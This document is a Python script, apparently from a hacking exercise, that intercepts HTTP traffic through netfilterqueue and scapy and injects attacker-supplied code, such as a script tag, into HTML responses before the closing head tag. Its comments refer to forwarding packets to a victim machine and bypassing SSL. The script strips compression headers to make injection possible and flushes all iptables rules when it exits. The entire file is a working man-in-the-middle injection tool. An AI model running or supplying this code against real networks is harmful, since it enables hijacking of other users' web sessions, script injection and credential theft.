#!/usr/bin/env python3

  #first create a queue using command: "iptables -I FORWARD -j NFQUEUE --queue-num 0"
  #where 0 is queue number, it can be any number of developer choice and it's only for the forwarded packets
  #queue is created so packets can be modified and then forwarded to the victim machine
  #Make sure you bypass the ssl encryption


import netfilterqueue                                            #module to access queue from python program
import scapy.all as scapy
import re
import subprocess
import optparse


def get_arguements():
    # Parse the arguements from command line
    parser = optparse.OptionParser()                                             
    parser.add_option("-c", "--code", dest="code", help="Injected Code")            
    options=parser.parse_args() [0]                                               
    # checks whether options are povided
    if not options.code:
        parser.error("[-]Please specify the code to be injected,use --help for more info")

    return options


def flush():
    # Flush the iptables rule created at the beginning
    flush_result=subprocess.check_output("iptables --flush",shell=True)
    if not flush_result:
        print("[+] Successfully flushed iptables")


                #NOTE:-If original "packet" is changed then the "scapy_packet" also changed.

def rr_print(request_response):                                                     # request  and response print
    # if request_response=="REQUEST": request_response = request_response
    # else : request_response = request_response
    global pos
    if pos == 1 or pos == 3: request_response=request_response+"[-]" ; pos += 1
    elif pos == 2: request_response=request_response+"[/]" ; pos += 1
    else: request_response=request_response+"[\]" ; pos = 1
    print("\r[+]" + request_response, end="")

def set_load(packet,load):                     #function to modify packet to chaged content
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len                       # deleting the length and chcksum fields to prevent the packet corruption
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet

def process_packet(packet):
    # Modify and play with the packets
    scapy_packet = scapy.IP(packet.get_payload())               #wrapping the payload of this scapy IP layer and converting into scapy layer
                                                                #get_payload method to view moare info
    if scapy_packet.haslayer(scapy.Raw):                        #checks layer where data is stored
        load=scapy_packet[scapy.Raw].load.decode(errors="ignore")
        original_load = load
        print(scapy_packet)
        if scapy_packet[scapy.TCP].dport==80:                   
            # modifies the request to specific request
            rr_print("REQUEST")
            load=re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            load=load.replace("HTTP/1.1", "HTTP/1.0")
            # print(scapy_packet.show())

        elif scapy_packet[scapy.TCP].sport==80:
            # injects the code in the response                 
            rr_print("RESPONSE")
            # print(scapy_packet.show())
            global options
            injection_code=options.code                            # eg:- '<script>alert("You are Hacked !!");</script>'
            load = load.replace("</head>", injection_code + "</head>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)",load)
            # modifies the length of response by adding the length of injected code
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length=int(content_length) + len(injection_code)
                load=load.replace(content_length,str(new_content_length))

        if load != original_load:                  #to prevent modification of packets other than port 80
            modified_packet = set_load(scapy_packet, load)
            packet.set_payload(bytes(modified_packet))                 # replacing the real packet with modified packet
            # print(new_packet.show())


    packet.accept()                                             #to allow the packet to reach their destination(target)
    # packet.drop()                                             #to drop the packets [CUTS the INTERNET of the target]


def queue_bind():
    # Binds the queue with id 0
    queue=netfilterqueue.NetfilterQueue()
    queue.bind(0,process_packet)                 
    queue.run()


def queue_create(): 
    # # For capturing all the packets that are forwarded 
    # create_result = subprocess.check_output("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)  #for the packets to be forwarded
    # if not create_result:
    #     print("[+] Queue created with OUTPUT chain")

    # For the local machine 
    create_result = subprocess.check_output("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)  #for packets going out of my machine
    if not create_result:
        print("[+] Queue created with OUTPUT chain")
    create_result = subprocess.check_output("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)  #for packets coming to my machine
    if not create_result:
        print("[+] Queue created with INPUT chain")

    
 # main code
options = get_arguements()
queue_create()
pos =1
try:
    queue_bind()
except KeyboardInterrupt:
    print("[+]Detected Ctrl+C.....flushing iptables.....")
    flush()